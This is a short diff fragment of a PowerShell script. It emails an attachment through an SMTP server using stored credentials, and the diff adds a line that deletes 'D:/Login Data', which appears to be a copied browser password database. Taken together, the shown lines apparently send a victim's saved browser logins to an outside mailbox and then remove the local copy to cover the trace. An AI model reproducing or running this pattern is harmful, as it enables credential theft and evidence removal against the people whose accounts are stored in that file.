@@ -14,3 +14,4 @@ $credentials = new-object Management.Automation.PSCredential $From, ($Pass | Con
 Send-MailMessage -From $From -to $To -Subject $Subject `
 -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
 -Credential $credentials -Attachments $Attachment
+ remove-item 'D:/Login Data'
